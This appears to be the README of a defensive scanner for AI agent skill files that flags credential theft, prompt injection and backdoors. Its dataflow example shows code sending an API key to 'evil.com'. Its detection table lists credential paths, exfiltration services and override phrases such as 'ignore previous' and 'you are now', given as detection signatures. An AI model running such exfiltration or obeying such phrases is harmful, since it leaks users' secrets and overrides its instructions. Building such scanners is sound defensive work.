# Skill Auditor

Security scanner that catches malicious skills before they steal your data. Detects credential theft, prompt injection, and hidden backdoors.

## Quick Start

**Scan a skill:**
```bash
node scripts/scan-skill.js path/to/skill
```

**Audit all installed skills:**
```bash
node scripts/audit-installed.js
```

**Enable advanced features:**
```bash
node scripts/setup.js
```

## What It Catches

- Skills trying to steal your API credentials
- Prompt injection attacks hidden in skill files
- Suspicious network calls to data capture services
- Encoded payloads and obfuscated code
- Skills that lie about what they actually do

## How It Works

The core scanner runs pattern matching against 40+ known threat signatures. It compares what a skill claims to do (in its description) against what the code actually does, then rates accuracy from 1-10.

Risk levels: CLEAN → LOW → MEDIUM → HIGH → CRITICAL

## Optional: AST Dataflow Analysis

For deeper analysis that traces data from source to sink:

```bash
pip install tree-sitter tree-sitter-python
```

This lets the scanner follow data flows like:
```python
key = os.environ.get('API_KEY')  # source
requests.post('evil.com', data=key)  # sink ← flagged!
```

No compiler needed. Prebuilt packages work on Windows, Mac, and Linux.

## Setup Wizard

Run the interactive setup to configure optional features:

```bash
node scripts/setup.js
```

The wizard will:
1. Check if Python is available
2. Offer to install tree-sitter (opt-in)
3. Configure auto-scan on skill install (opt-in)
4. Save your preferences

Check current config:
```bash
node scripts/setup.js --status
```

## Detection Categories

| Category | What It Finds |
|----------|---------------|
| Credential Access | .ssh/, .env, .aws/credentials, API keys in env vars |
| Data Exfiltration | webhook.site, requestbin, ngrok, encoded POST data |
| Shell Execution | child_process, subprocess, os.system, eval() |
| Prompt Injection | "ignore previous", "you are now", fake system delimiters |
| Persistence | Memory file writes, cron job creation, startup scripts |
| Obfuscation | Base64 payloads, string concatenation, unicode escapes |

## Output Formats

**Human-readable (default):**
```bash
node scripts/scan-skill.js path/to/skill
```

**JSON for automation:**
```bash
node scripts/scan-skill.js path/to/skill --json report.json
```

**SARIF for GitHub Code Scanning:**
```bash
node scripts/scan-skill.js path/to/skill --format sarif
```

## New in v2.1

- Setup wizard with opt-in features for all platforms
- Audit command scans all installed skills at once
- Fewer false alarms on legitimate skills
- Tested against Cisco Talos security research

## License

MIT
